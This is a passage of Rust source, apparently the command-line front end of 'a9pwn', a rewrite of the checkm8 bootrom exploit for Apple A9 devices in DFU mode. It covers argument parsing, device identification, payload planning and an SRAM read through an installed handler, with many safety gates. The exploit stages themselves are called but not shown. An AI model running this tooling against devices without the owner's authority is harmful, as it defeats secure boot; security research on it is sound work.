//! a9pwn — CLI. OWNER: **Lead only.** This file is the enforcing contract for
//! every module: it calls the frozen signatures, so if it compiles, the modules
//! agree with `INTERFACE.md`.

use std::path::PathBuf;
use std::process::ExitCode;
use std::time::{Duration, Instant};

use a9pwn::payload;
use a9pwn::stages::{self, RunOptions, SetupBudget};
use a9pwn::trace::Tracer;
use a9pwn::types::{DeviceIdentity, ResetCapability, RunOutcome, Stage, XferStatus};
use a9pwn::usb::{CtrlReq, Transport};
use a9pwn::verdict;

const EXIT_OK: u8 = 0;
const EXIT_NO_DEVICE: u8 = 1;
const EXIT_BAD_ARGS: u8 = 2;
const EXIT_UNSUPPORTED: u8 = 3;
const EXIT_PREFLIGHT_REFUSED: u8 = 4;
const EXIT_EXHAUSTED: u8 = 5;
const EXIT_TRANSPORT: u8 = 6;

fn usage() {
    println!(
        "a9pwn — gaster's checkm8, rewritten in Rust with instrumentation built in\n\
         \n\
         USAGE: a9pwn <command> [options]\n\
         \n\
         COMMANDS\n\
           ident       read-only: identity, bound driver, reset capability\n\
           preflight   ident, then refuse to continue if resets are not real\n\
           reset       bare port reset, reporting what it actually did\n\
           plan        build the payload and print every field; send NOTHING\n\
           selftest    offline checks: blob hashes, struct sizes, config table\n\
           readwindow  read SRAM through the resident handler; no DNLOAD, no mailbox\n\
           run         THE EXPLOIT. Writes to the device.\n\
         \n\
         READWINDOW — needs a pwn made with `--handler readwindow` (see OPTIONS)\n\
           a9pwn readwindow ADDR:LEN [--expect-file F [--image-base A]] [--dry-run] [--json]\n\
           ONE request: bmRequestType 0xA1, bRequest 0x2, wValue 0xFFFF (the ONLY wValue\n\
           MEASURED to reach a handler), wIndex = window index ((ADDR - 0x180000000) >> 12,\n\
           index 1..=0x3FF), wLength = LEN. The reply is LEN bytes of SRAM, reported AS\n\
           MEMORY (no DONE_MAGIC is demanded). It sends no DNLOAD and, with the readwindow\n\
           handler resident, never touches the command mailbox: the handler checks wValue,\n\
           then wIndex, and branches to the read arm without loading [mailbox], so a stale\n\
           EXEC_MAGIC in the buffer cannot be executed by a read. It therefore works with\n\
           an image staged at 0x180380000. The handler bounds the window inside mapped\n\
           SRAM; the host refuses first, so a bad argument costs no transfer. The stock\n\
           command form (wValue 0xFFFF, wIndex 0) is preserved word for word.\n\
           HAZARD: with the STOCK handler resident this same request is not a read - the\n\
           stock arm loads the mailbox magic, so a stale EXEC_MAGIC there is a wild execute.\n\
           Reachable is not the same as safe; see a9boot/HANDLER-RELOCATION.md 6.\n\
           --new-brequest uses the A1/0x1F form (MEASURED filtered) for the record only.\n\
         \n\
         OPTIONS\n\
           --handler stock|readwindow  which resident handler `run` installs (default stock).\n\
           `readwindow` must be installed by a pwn before the command can answer.\n\
           --expect-file F            compare the reply against F at ADDR - --image-base\n\
           --expect-offset N          compare at this file offset instead\n\
           --image-base A             where F starts in SRAM (default 0x180380000)\n\
           --expect-state N           require this DFU state from the ROM's own GET_STATUS\n\
           --new-brequest             use the A1/0x1F form (MEASURED filtered); default is the routed form\n\
           --probe-shape              send ONLY the safe handler-shape probe and exit. It never uses\n\
           wValue 0xFFFF, so no handler can load [mailbox] for it; an all-zero reply means the OLD\n\
           handler is resident and the routed read must NOT be sent.\n\
           --ack-routed-handler       REQUIRED for a live read: the routed read's wValue 0xFFFF is\n\
           the value that arms the stock data-driven path, so it is only safe while THIS handler\n\
           is resident. No wire request can verify that (the only hook instrument is the read\n\
           itself); the install line `PATCH blob : handler=readwindow … sha256 …` is the evidence,\n\
           and this flag is the operator's assertion. Stale handler + routed read = wild execute.
           --unsafe-shape-unknown     let --shape-first continue on a SHAPE_UNKNOWN probe (fix 3).
           Deliberately unsafe: an unknown handler + routed read is the wild-execute path.\n\
           --json                     one-line JSON transcript instead of prose\n\
           --rounds N                 max stage rounds (default 64)\n\
           --dry-run                  build everything, send nothing\n\
           --verbose | -v             per-transfer lines\n\
           --trace FILE               JSONL event log\n\
           --stage reset|setup|spray|patch   run one stage only\n\
           --allow-winusb             proceed even though resets are no-ops\n\
           --force                    run the exploit even if the serial descriptor already\n\
           carries PWND:[checkm8]. Without it a marker left by an earlier pwn\n\
           makes `run` send NOTHING (transfers=0), and the verdict now refuses\n\
           [PWNED] in exactly that case (rule 14, RUNG2-EVIDENCE.md 6.0p).\n\
           Needed to re-pwn while an image is held in the DFU buffer: the only\n\
           other way to clear the marker, a Power+Home re-entry, destroys it.\n\
           --leak-windex N | --leak-windex-ipwndfu   spray leak wIndex: N (decimal or 0x hex,\n\
           default 0x0A = gaster.c:52), or 0x00 for the ipwndfu lineage — a probe,\n\
           not a second opinion\n\
           --pad-timeout-ms N         the PAD request's own timeout, ms (default 40).\n\
           Deliberately separate from --usb-timeout-ms: the pad is the pass\n\
           condition and this device answers it in 21-37 ms (measured), while\n\
           --usb-timeout-ms sets the abort windows, where a larger value lets\n\
           the whole DNLOAD complete and destroys the sweep.\n\
           --stop-after-setup-stall   exit as soon as SETUP passes (diagnostic)\n\
           --setup-budget N           max SETUP attempts before giving up (default 20000)\n\
           --settle-ms N              sleep between rounds (default 0)
           --send                     probe-clrstatus: actually transmit (default is a dry run)
           --watch-ms N               probe-clrstatus: presence-watch window (default 3000)\n\
         \n\
         EXIT CODES  0 ok/ pwned · 1 no device · 2 bad arguments · 3 unsupported chip\n\
                     4 preflight refused · 5 exhausted · 6 transport error"
    );
}

fn flag(args: &[String], name: &str) -> bool {
    args.iter().any(|a| a == name)
}

fn value(args: &[String], name: &str) -> Option<String> {
    args.iter()
        .position(|a| a == name)
        .and_then(|i| args.get(i + 1))
        .cloned()
}

fn number(args: &[String], name: &str) -> Option<u64> {
    value(args, name).and_then(|v| v.parse::<u64>().ok())
}

/// The exit code for a finished run — derived from the VERDICT first (review/04 F7): the process
/// used to map `RunOutcome::Pwned` to 0 unconditionally, so `PWNED_UNMEASURED` — whose own
/// headline says "this is NOT a PWNED verdict" — still exited 0 and `a9pwn run && next-step`
/// chains proceeded on a refusal. The shell and the print disagreed about the same run. Now a
/// `PWNED_*` refusal verdict is `EXIT_PREFLIGHT_REFUSED` whatever the outcome, and only a real
/// [`verdict::PWNED`] exits 0 from that family; everything else keeps the outcome mapping.
fn exit_for(outcome: &RunOutcome, verdict_code: &str) -> ExitCode {
    match verdict_code {
        verdict::PWNED => return ExitCode::from(EXIT_OK),
        verdict::PWNED_UNMEASURED
        | verdict::PWNED_UNCONFIRMED
        | verdict::PWNED_MARKER_PREEXISTING => return ExitCode::from(EXIT_PREFLIGHT_REFUSED),
        _ => {}
    }
    match outcome {
        RunOutcome::Pwned => ExitCode::from(EXIT_OK),
        RunOutcome::NoDevice => ExitCode::from(EXIT_NO_DEVICE),
        RunOutcome::Unsupported(_) => ExitCode::from(EXIT_UNSUPPORTED),
        RunOutcome::Exhausted { .. } => ExitCode::from(EXIT_EXHAUSTED),
        RunOutcome::Aborted(_) => ExitCode::from(EXIT_TRANSPORT),
    }
}

#[cfg(test)]
mod exit_for_tests {
    use super::*;

    /// **The firing control for F7**: a refusal verdict never exits 0, whatever the outcome
    /// says — and the mutation gate is the old mapping (`RunOutcome::Pwned` alone → 0), which
    /// these two cases are exactly the shape of.
    #[test]
    fn control_a_pwned_refusal_verdict_never_exits_zero() {
        assert_eq!(exit_for(&RunOutcome::Pwned, verdict::PWNED), ExitCode::from(EXIT_OK));
        assert_eq!(
            exit_for(&RunOutcome::Pwned, verdict::PWNED_UNMEASURED),
            ExitCode::from(EXIT_PREFLIGHT_REFUSED)
        );
        assert_eq!(
            exit_for(&RunOutcome::Pwned, verdict::PWNED_MARKER_PREEXISTING),
            ExitCode::from(EXIT_PREFLIGHT_REFUSED)
        );
        assert_eq!(
            exit_for(&RunOutcome::Pwned, verdict::PWNED_UNCONFIRMED),
            ExitCode::from(EXIT_PREFLIGHT_REFUSED)
        );
        // Non-PWNED verdicts keep the outcome mapping.
        assert_eq!(
            exit_for(&RunOutcome::NoDevice, verdict::DEVICE_ABSENT),
            ExitCode::from(EXIT_NO_DEVICE)
        );
        assert_eq!(
            exit_for(&RunOutcome::Exhausted { rounds: 1 }, verdict::EXHAUSTED_UNKNOWN),
            ExitCode::from(EXIT_EXHAUSTED)
        );
    }
}

/// gaster's own defaults (gaster.c:1631-1638).
const USB_TIMEOUT_MS: u32 = 5;
const ABORT_TIMEOUT_MIN_MS: u32 = 0;

fn build_options(args: &[String]) -> Result<RunOptions, String> {
    let stage_filter = match value(args, "--stage") {
        Some(s) => match Stage::parse(&s) {
            Some(st) => Some(st),
            None => {
                return Err(format!(
                    "--stage '{s}' is not one of reset|setup|spray|patch"
                ))
            }
        },
        None => None,
    };

    /// Decimal or 0x-prefixed hex, because the value that matters is a wire
    /// constant and reading it in hex is how it appears in the reference.
    fn parse_u16(s: &str) -> Result<u16, String> {
        let t = s.trim();
        let parsed = match t.strip_prefix("0x").or_else(|| t.strip_prefix("0X")) {
            Some(hex) => u16::from_str_radix(hex, 16),
            None => t.parse::<u16>(),
        };
        parsed.map_err(|e| e.to_string())
    }

    // gaster's 0x0A is the cited default (gaster.c:52, used at :866/:875/:886).
    // `--leak-windex` exists because the alternative this crate carried is built
    // on a false claim: `LEAK_WINDEX_IPWNDFU` is 0x00, but ipwndfu's
    // `checkm8.py` passes 0x40A and has no row for CPID 0x8000/0x8003 at all —
    // so it is a probe to be able to run, not a second opinion
    // (`a9pwn/docs/VERIFICATION-live-run.md` B3/V08).
    let leak_windex = match value(args, "--leak-windex") {
        Some(v) => parse_u16(&v).map_err(|e| format!("--leak-windex {v:?}: {e}"))?,
        None if flag(args, "--leak-windex-ipwndfu") => a9pwn::stages::LEAK_WINDEX_IPWNDFU,
        None => a9pwn::stages::LEAK_WINDEX_GASTER,
    };

    // The pad's timeout is deliberately NOT `usb_timeout_ms`. The pad request IS
    // the pass condition (gaster.c:853 asks whether it STALLs), and this device
    // answers it in 21-37 ms — MEASURED on two independent datasets (run 2: six
    // completions at 21.4-27.9 ms in 154 attempts; run 4: two at 21.5 and
    // 36.6 ms in 14,565). With a nominal 5 ms we were measuring the host's
    // impatience, not the device's answer. `usb_timeout_ms` still controls the
    // abort windows, where a larger value would let the whole 2048-byte DNLOAD
    // complete and destroy the sweep.
    let pad_timeout_ms = number(args, "--pad-timeout-ms")
        .unwrap_or_else(|| RunOptions::default().pad_timeout_ms as u64)
        as u32;

    // Which resident handler the PATCH install places. The default is gaster's, byte for byte;
    // `readwindow` installs the in-tree handler that adds the mailbox-free SRAM read. A name that
    // is neither is refused rather than defaulted, because a wrong handler is a payload that
    // behaves differently while looking identical in every other field.
    let handler = match value(args, "--handler").as_deref() {
        None | Some("stock") => payload::HandlerVariant::Stock,
        Some("readwindow") => payload::HandlerVariant::ReadWindow,
        Some(other) => {
            return Err(format!(
                "--handler {other:?} is not one of stock|readwindow (payload::HandlerVariant)"
            ))
        }
    };

    let opts = RunOptions {
        max_rounds: number(args, "--rounds").unwrap_or(64) as u32,
        usb_timeout_ms: number(args, "--usb-timeout-ms").unwrap_or(USB_TIMEOUT_MS as u64) as u32,
        abort_timeout_min_ms: number(args, "--abort-min-ms")
            .unwrap_or(ABORT_TIMEOUT_MIN_MS as u64) as u32,
        pad_timeout_ms,
        leak_windex,
        dry_run: flag(args, "--dry-run"),
        verbose: flag(args, "--verbose") || flag(args, "-v"),
        trace_path: value(args, "--trace").map(PathBuf::from),
        allow_winusb: flag(args, "--allow-winusb"),
        stage_filter,
        setup_budget: SetupBudget {
            max_attempts: number(args, "--setup-budget").unwrap_or(20_000),
            max_millis: 600_000,
        },
        stop_after_setup_stall: flag(args, "--stop-after-setup-stall"),
        // Rule 14 (`RUNG2-EVIDENCE.md` §6.0p). Without this the stage logic treats a
        // marker left by an earlier pwn as "the payload is already resident", sends
        // nothing, and produces `transfers=0`. `--force` runs the exploit anyway,
        // which is what re-pwning while an image is held in the DFU buffer needs: a
        // Power+Home re-entry (the only other way to clear the marker) destroys that
        // image. The bar for the flag is deliberately high — it writes to the device
        // on a device that already reports pwned.
        force: flag(args, "--force"),
        probe_setup_state: flag(args, "--probe-setup-state"),
        settle_ms: number(args, "--settle-ms").unwrap_or(0) as u32,
        handler,
        mailbox_relocated: flag(args, "--mailbox-relocated"),
    };
    if opts.usb_timeout_ms < 1 {
        return Err("--usb-timeout-ms must be >= 1".to_string());
    }
    if opts.abort_timeout_min_ms > opts.usb_timeout_ms {
        return Err(format!(
            "--abort-min-ms ({}) must be <= --usb-timeout-ms ({})",
            opts.abort_timeout_min_ms, opts.usb_timeout_ms
        ));
    }
    Ok(opts)
}

fn print_identity(id: &DeviceIdentity, driver: a9pwn::types::DriverClass, cap: ResetCapability) {
    // §9.8: the ECID is device-unique and belongs in no log. The descriptor is
    // printed masked so the SRTG/CPID parts stay readable for diagnosis.
    println!("  serial        : {}", a9pwn::trace::redact_ecid(&id.serial));
    println!("  CPID          : {}", id.cpid_hex());
    println!(
        "  CPRV / BDID   : {} / {}",
        id.cprv.map(|v| format!("0x{v:02X}")).unwrap_or_else(|| "-".into()),
        id.bdid.map(|v| format!("0x{v:02X}")).unwrap_or_else(|| "-".into())
    );
    println!(
        "  SRTG          : {}",
        id.srtg.clone().unwrap_or_else(|| "(absent - not SecureROM DFU?)".into())
    );
    println!(
        "  ECID          : {}",
        id.ecid.map(|e| format!("...{:04X} (masked)", e & 0xFFFF)).unwrap_or_else(|| "-".into())
    );
    println!("  A9 target     : {}", if id.is_a9() { "yes" } else { "NO" });
    println!("  driver service: {}", driver.as_str());
    println!("  reset         : {}", cap.as_str());
    println!(
        "  PWND marker   : {}",
        if id.is_pwned() { "PRESENT - device is pwned" } else { "absent" }
    );
}

fn main() -> ExitCode {
    let args: Vec<String> = std::env::args().skip(1).collect();
    let command = args.first().cloned().unwrap_or_else(|| "ident".to_string());

    if flag(&args, "--help") || flag(&args, "-h") || command == "help" {
        usage();
        return ExitCode::from(EXIT_OK);
    }

    match command.as_str() {
        // ---------------------------------------------------------------- ident
        "ident" | "preflight" => {
            println!("a9pwn ident");
            println!();
            let t = match Transport::open_first_dfu() {
                Ok(t) => t,
                Err(e) => {
                    println!("  no DFU device: {e}");
                    return ExitCode::from(EXIT_NO_DEVICE);
                }
            };
            let id = t.identity();
            let driver = t.driver_class();
            let cap = t.reset_capability();
            print_identity(&id, driver, cap);
            // The negotiated speed decides how to read a 0-byte aborted transfer:
            // at full speed 2048 bytes needs ~32 ms of 64-byte frames, so no
            // 0..5 ms abort window could ever report a byte; at high speed a 4-5 ms
            // window can carry all 2048, so a 0-byte count there means the DNLOAD
            // never reached the wire. Measured at open by usb.rs, not inferred.
            println!(
                "  usb speed     : {} (negotiated, measured at open)",
                a9pwn::usb::speed_name(t.device_speed())
            );

            if command == "preflight" && cap != ResetCapability::Real {
                println!();
                let v = verdict::classify(
                    &RunOutcome::Aborted("preflight refused".into()),
                    &Default::default(),
                    &id,
                    driver,
                    cap,
                );
                println!("  VERDICT  {}  [{}]", v.headline, v.code);
                for e in &v.evidence {
                    println!("    evidence: {e}");
                }
                println!("    next    : {}", v.next_action);
                return ExitCode::from(EXIT_PREFLIGHT_REFUSED);
            }
            ExitCode::from(EXIT_OK)
        }

        // ---------------------------------------------------------------- reset
        "reset" => {
            println!("a9pwn reset");
            let mut t = match Transport::open_first_dfu() {
                Ok(t) => t,
                Err(e) => {
                    println!("  no DFU device: {e}");
                    return ExitCode::from(EXIT_NO_DEVICE);
                }
            };
            match t.reset() {
                Ok(r) => {
                    println!("  libusb rc     : {}", r.libusb_rc);
                    println!("  capability    : {}", r.capability.as_str());
                    println!("  took          : {} us", r.micros);
                    println!("  what happened : {}", r.note);
                    ExitCode::from(EXIT_OK)
                }
                Err(e) => {
                    println!("  reset failed: {e}");
                    ExitCode::from(EXIT_TRANSPORT)
                }
            }
        }

        // ----------------------------------------------------------------- plan
        "plan" => {
            println!("a9pwn plan (DRY RUN - nothing will be sent)");
            println!();
            let t = match Transport::open_first_dfu() {
                Ok(t) => t,
                Err(e) => {
                    println!("  no DFU device: {e}");
                    return ExitCode::from(EXIT_NO_DEVICE);
                }
            };
            let id = t.identity();
            print_identity(&id, t.driver_class(), t.reset_capability());
            println!();

            if let Err(e) = payload::verify_blob_hashes() {
                println!("  BLOB VERIFICATION FAILED: {e}");
                return ExitCode::from(EXIT_TRANSPORT);
            }
            println!("  blob sha256   : both blobs verified");

            let (cfg, kind) = match a9pwn::config::config_for_identity(&id) {
                Ok(v) => v,
                Err(e) => {
                    println!("  no config for this device: {e}");
                    return ExitCode::from(EXIT_UNSUPPORTED);
                }
            };
            println!("  config        : {} ({:?})", cfg.name, kind);
            println!("  overwrite_pad : 0x{:X}", cfg.overwrite_pad);
            println!("  insecure_base : 0x{:X}", cfg.insecure_memory_base);
            println!();

            let plan_handler = match value(&args, "--handler").as_deref() {
                None | Some("stock") => payload::HandlerVariant::Stock,
                Some("readwindow") => payload::HandlerVariant::ReadWindow,
                Some(other) => {
                    println!("  --handler {other:?} is not one of stock|readwindow");
                    return ExitCode::from(EXIT_BAD_ARGS);
                }
            };
            let plan_mailbox = if flag(&args, "--mailbox-relocated") {
                a9pwn::config::S1_MAILBOX_BASE
            } else {
                cfg.insecure_memory_base
            };
            match payload::build_payload_variant(&cfg, kind, plan_handler, plan_mailbox) {
                Ok(built) => {
                    println!("  handler       : {}", built.handler.name());
                    println!("  payload_dest  : 0x{:X}", built.payload_dest);
                    println!("  payload_sz    : {} bytes", built.payload_sz);
                    println!("  payload       : {} bytes", built.blob.len());
                    println!("  overwrite     : {} bytes", built.overwrite.len());
                    println!("  blob sha256   : {}", built.blob_sha256);
                    println!();
                    println!("  {:<6} {:<6} {:<22} value", "off", "len", "field");
                    for f in &built.fields {
                        println!(
                            "  0x{:03X}  {:<6} {:<22} 0x{:016X}",
                            f.off, f.len, f.label, f.value
                        );
                    }
                }
                Err(e) => {
                    println!("  payload build failed: {e}");
                    return ExitCode::from(EXIT_TRANSPORT);
                }
            }
            ExitCode::from(EXIT_OK)
        }

        // ----------------------------------------------------------- readwindow
        //
        // The one request that can read SRAM while the DFU buffer holds a staged image: no DNLOAD
        // (which DFU state 5 consumes as image data) and no mailbox (which an image overwrites,
        // and which the stock `0xFFFF` arm *executes* — see a9boot/HANDLER-RELOCATION.md §6).
        "readwindow" => {
            use a9pwn::readwindow as rw;

            let arm = match rw::vendored_arm() {
                Ok(a) => a,
                Err(e) => {
                    println!("a9pwn readwindow: the vendored handler does not decode: {e}");
                    return ExitCode::from(EXIT_TRANSPORT);
                }
            };

            // PROBE-ONLY MODE. Safe on every handler (it never uses wValue 0xFFFF), so it needs
            // no acknowledgement and can be the first thing sent to a device whose handler is
            // unknown. Run before every routed read, or alone when the handler is in doubt.
            let json = flag(&args, "--json");
            let probe_only = flag(&args, "--probe-shape")
                && args.get(1).filter(|s| !s.starts_with("--")).is_none();
            if probe_only {
                let mut t = match Transport::open_first_dfu() {
                    Ok(t) => t,
                    Err(e) => {
                        println!("  no DFU device: {e}");
                        return ExitCode::from(EXIT_NO_DEVICE);
                    }
                };
                let _ = t.identity();
                let timeout_ms = number(&args, "--timeout-ms").unwrap_or(1000).max(1) as u32;
                let probe = rw::shape_probe_request(0x40);
                let mut buf = vec![0u8; 0x40];
                let pr = t.control(probe, &mut buf, timeout_ms);
                let n = pr.transferred.min(buf.len());
                let (code, why) = rw::classify_shape(&buf[..n]);
                if json {
                    println!(
                        "{{\"tool\":\"a9pwn\",\"command\":\"handler-shape\",\"setup\":\"{}\",\
                         \"transferred\":{},\"transport\":\"{:?}\",\"result\":\"{code}\",\
                         \"detail\":\"{}\"}}",
                        rw::setup_fields(&probe),
                        n,
                        pr.status,
                        why.replace('"', "\\\"")
                    );
                } else {
                    println!("a9pwn handler-shape probe — safe on every handler (wValue {:#06x}, never 0xFFFF)", probe.value);
                    println!("  SETUP         : {}", rw::setup_fields(&probe));
                    println!("  readback      : {} byte(s), transport {:?}, {} us", n, pr.status, pr.micros);
                    println!("  RESULT        : {code}");
                    println!("  detail        : {why}");
                }
                return match code {
                    rw::SHAPE_OLD_HANDLER => ExitCode::from(EXIT_PREFLIGHT_REFUSED),
                    rw::SHAPE_UNKNOWN => ExitCode::from(EXIT_TRANSPORT),
                    _ => ExitCode::from(EXIT_OK),
                };
            }

            let spec = match args.get(1).filter(|s| !s.starts_with("--")) {
                Some(s) => s.clone(),
                None => {
                    eprintln!(
                        "a9pwn: readwindow needs ADDR:LEN (e.g. 0x180384000:0x1000). \
                         `a9pwn --help` for the request it sends."
                    );
                    return ExitCode::from(EXIT_BAD_ARGS);
                }
            };
            let (addr, len) = match rw::parse_window(&spec) {
                Ok(v) => v,
                Err(e) => {
                    eprintln!("a9pwn: {e}");
                    return ExitCode::from(EXIT_BAD_ARGS);
                }
            };

            let dry = flag(&args, "--dry-run");
            let timeout_ms = number(&args, "--timeout-ms").unwrap_or(1000).max(1) as u32;
            let expect_state = number(&args, "--expect-state").map(|v| v as u8);
            let expect_file = value(&args, "--expect-file");
            let image_base = number(&args, "--image-base").unwrap_or(0x1803_8000);
            let expect_offset = number(&args, "--expect-offset");

            // Step 1: the request, or a refusal by name. **Nothing is sent on a refusal**, so a
            // bad argument costs no transfer at all. The handler holds the same bound on its side;
            // this is the host half of a bound that must exist in both places.
            let new_brequest = flag(&args, "--new-brequest");
            let build = |a: &rw::ReadArm| -> Result<CtrlReq, String> {
                if new_brequest {
                    rw::read_window_request_newcode(a, addr, len)
                } else {
                    rw::read_window_request(a, addr, len)
                }
            };
            if let Err(e) = build(&arm) {
                if json {
                    println!(
                        "{{\"tool\":\"a9pwn\",\"command\":\"readwindow\",\"addr\":\"{addr:#x}\",\
                         \"len\":{len},\"result\":\"REFUSED\",\"detail\":\"{}\"}}",
                        e.replace('"', "\\\"")
                    );
                } else {
                    println!("a9pwn readwindow — REFUSED before any transfer");
                    println!("  {e}");
                    println!("  nothing was sent; the device was not opened");
                }
                return ExitCode::from(EXIT_PREFLIGHT_REFUSED);
            }
            let request = build(&arm).expect("checked above");

            if dry {
                if json {
                    let out = rw::ReadOutcome {
                        addr,
                        len,
                        request,
                        state_before: None,
                        refused: None,
                        code: rw::PLANNED.to_string(),
                        bytes: Vec::new(),
                        transferred: 0,
                        transferred_known: true,
                        prefix_unverified: Vec::new(),
                        micros: 0,
                        transport: "NOT_SENT".to_string(),
                    };
                    println!("{}", rw::json_line(&out, Some(&arm)));
                } else {
                    println!("a9pwn readwindow (DRY RUN - nothing will be sent)");
                    println!(
                        "  window        : {addr:#x}+{len:#x}  (index {:#x}, source {:#x})",
                        request.index,
                        arm.base + ((request.index as u64) << arm.granule_shift)
                    );
                    println!("  SETUP         : {}", rw::setup_fields(&request));
                    println!(
                        "  preflight     : then one ROM DFU_GET_STATUS (0xA1/0x03, 6 bytes); \
                         {}",
                        match expect_state {
                            Some(s) => format!("--expect-state {s} enforced"),
                            None => "the state is reported, not gated (rule 13)".to_string(),
                        }
                    );
                    println!(
                        "  handler       : readwindow, {} bytes, sha256 {}",
                        payload::READWINDOW_BLOB_LEN,
                        payload::READWINDOW_BLOB_SHA256
                    );
                    println!(
                        "  requires      : a pwn made with `--handler readwindow` \
                         (payload_dest 0x{:X})",
                        a9pwn::config::A9_8003.boot_tramp_end
                            - (payload::READWINDOW_CODE_LEN
                                + payload::HANDLE_CHECKM8_STRUCT_SIZE)
                                as u64
                    );
                    println!("  sends         : NOTHING");
                }
                return ExitCode::from(EXIT_OK);
            }

            // The enforcement the doc could not provide: the routed read is only safe while THIS
            // handler is resident, no wire request can verify that, and a stale handler turns
            // `wValue 0xFFFF` into the stock data-driven arm. So a live read is a deliberate act.
            if !flag(&args, "--ack-routed-handler") {
                eprintln!(
                    "a9pwn: refusing a LIVE routed read without --ack-routed-handler.\n\
                     \n\
                     Why: this read uses wValue 0xFFFF, the one routed value — and also the value\n\
                     that sends the STOCK handler (and the OLD wValue=index read-window handler)\n\
                     into their legacy path, where [mailbox] is loaded and a stale EXEC_MAGIC is a\n\
                     WILD EXECUTE. That is the accident of round 6, reproduced in analysis tonight\n\
                     (round 31's handler + this client).\n\
                     \n\
                     Verify first, then assert:\n\
                     a9pwn readwindow ADDR:LEN --probe-shape     # safe on EVERY handler, no [mailbox] load\n\
                     a9pwn run --handler readwindow --force      # prints: PATCH blob : handler=readwindow … sha256 …\n\
                     a9pwn readwindow ADDR:LEN --ack-routed-handler\n\
                     \n\
                     a9boot/HANDLER-RELOCATION.md 4.1 and 6 state the limit in full."
                );
                return ExitCode::from(EXIT_BAD_ARGS);
            }

            let mut t = match Transport::open_first_dfu() {
                Ok(t) => t,
                Err(e) => {
                    println!("  no DFU device: {e}");
                    return ExitCode::from(EXIT_NO_DEVICE);
                }
            };
            let id = t.identity();

            // Optional, and safe: run the shape probe first in the SAME invocation, so the
            // operator's assertion is checked against the wire rather than taken on faith.
            if flag(&args, "--probe-shape") || flag(&args, "--shape-first") {
                let probe = rw::shape_probe_request(0x40);
                let mut buf = vec![0u8; 0x40];
                let pr = t.control(probe, &mut buf, timeout_ms);
                let n = pr.transferred.min(buf.len());
                let (code, why) = rw::classify_shape(&buf[..n]);
                println!("  shape probe   : {}", rw::setup_fields(&probe));
                println!("  shape result  : {} ({} byte(s), transport {:?})", code, n, pr.status);
                println!("  shape detail  : {why}");
                // INSTRUMENT FIX 3 (review/04 F4): SHAPE_UNKNOWN used to fall through and SEND the
                // hazardous routed read — exactly when the probe had no information about which
                // handler is resident. Now only a positive SHAPE_ROUTED_OR_STOCK authorises it;
                // --unsafe-shape-unknown is the operator's explicit, deliberately unsafe override.
                if let Err(gate) = rw::shape_gate(code, flag(&args, "--unsafe-shape-unknown")) {
                    println!("  ABORT         : {gate}");
                    return ExitCode::from(EXIT_PREFLIGHT_REFUSED);
                }
                if code == rw::SHAPE_UNKNOWN {
                    println!(
                        "  WARNING       : proceeding on --unsafe-shape-unknown: the probe made no \
                         statement about the resident handler, and the routed read is being sent \
                         anyway on the operator's explicit override."
                    );
                }
            }

            if !json {
                println!("a9pwn readwindow — LIVE: one read through the resident handler");
                println!("  device        : {}", a9pwn::trace::redact_ecid(&id.serial));
                println!(
                    "  window        : {addr:#x}+{len:#x}  (index {:#x}, source {:#x})",
                    request.index,
                    arm.base + ((request.index as u64) << arm.granule_shift)
                );
                println!("  SETUP         : {}", rw::setup_fields(&request));
                println!("  sends         : this request only — no DNLOAD, no mailbox write");
                println!();
            }

            let out = rw::run(&mut t, &arm, addr, len, timeout_ms, expect_state, false);

            // Step 3: the reply as memory, and — if the operator supplied a file — a machine
            // decision on whether this window is that file's bytes.
            let mut verdict = out.code.clone();
            let mut compared: Option<String> = None;
            if out.ok() {
                if let Some(path) = &expect_file {
                    match std::fs::read(path) {
                        Ok(file) => {
                            let offset = match expect_offset {
                                Some(o) => o as usize,
                                None => match addr.checked_sub(image_base) {
                                    Some(o) => o as usize,
                                    None => {
                                        println!(
                                            "  REFUSED: {addr:#x} is below --image-base \
                                             {image_base:#x}; there is no file offset for it"
                                        );
                                        return ExitCode::from(EXIT_PREFLIGHT_REFUSED);
                                    }
                                },
                            };
                            match rw::compare(&file, offset, &out.bytes) {
                                Ok(()) => {
                                    verdict = "MATCH".to_string();
                                    compared = Some(format!(
                                        "MATCH: all {} byte(s) equal {path} at file offset \
                                         {offset:#x}",
                                        out.bytes.len()
                                    ));
                                }
                                Err(e) => {
                                    verdict = "MISMATCH".to_string();
                                    compared = Some(e);
                                }
                            }
                        }
                        Err(e) => {
                            verdict = "EXPECT_FILE_UNREADABLE".to_string();
                            compared = Some(format!(
                                "EXPECT_FILE_UNREADABLE: {path}: {e}. No comparison was made; \
                                 this is not a mismatch."
                            ));
                        }
                    }
                }
            }

            if json {
                let mut line = rw::json_line(&out, Some(&arm));
                // The verdict and the comparison are appended by name so a shell can read them.
                line = line.trim_end_matches('}').to_string();
                println!(
                    "{line},\"verdict\":\"{verdict}\",\"comparison\":{}}}",
                    match &compared {
                        Some(c) => format!("\"{}\"", c.replace('"', "\\\"")),
                        None => "null".to_string(),
                    }
                );
            } else {
                println!(
                    "  preflight     : ROM GET_STATUS state {:?} ({})",
                    out.state_before, out.transport
                );
                println!(
                    "  read          : transferred {} of {len}, transport {}, {} us",
                    if out.transferred_known {
                        out.transferred.to_string()
                    } else {
                        "UNKNOWN (no length on failure; the sync API's 0 is not a measurement)"
                            .to_string()
                    },
                    out.transport,
                    out.micros
                );
                if !out.prefix_unverified.is_empty() {
                    println!(
                        "  prefix        : {} byte(s) recovered from the buffer, LENGTH UNVERIFIED \
                         (evidence, not memory): {}",
                        out.prefix_unverified.len(),
                        rw::hex_preview(&out.prefix_unverified, 48)
                    );
                }
                match &out.refused {
                    Some(e) => println!("  REFUSED       : {e}"),
                    None => println!("  memory        : {}", rw::memory_report(&out.bytes)),
                }
                if let Some((v, what)) = rw::hook_in_window(addr, len, &out.bytes) {
                    println!(
                        "  hook          : *{:#x} = {:#x} — {what}",
                        rw::HOOK_SLOT, v
                    );
                }
                if let Some(c) = &compared {
                    println!("  comparison    : {c}");
                }
                println!("  VERDICT       : {verdict}");
            }

            match verdict.as_str() {
                "OK" | "MATCH" => ExitCode::from(EXIT_OK),
                "MISMATCH" | "EXPECT_FILE_UNREADABLE" | "REFUSED" => {
                    ExitCode::from(EXIT_PREFLIGHT_REFUSED)
                }
                _ => ExitCode::from(EXIT_TRANSPORT),
            }
        }

        // ------------------------------------------------------------- selftest
        "selftest" => {
            println!("a9pwn selftest (offline; does not touch the device)");
            let mut failures = 0u32;

            match payload::verify_blob_hashes() {
                Ok(()) => println!("  [ok]   blob sha256 verified"),
                Err(e) => {
                    println!("  [FAIL] blob sha256: {e}");
                    failures += 1;
                }
            }

            println!(
                "  [info] sizeof(A9)={} sizeof(handle_checkm8_request)={}",
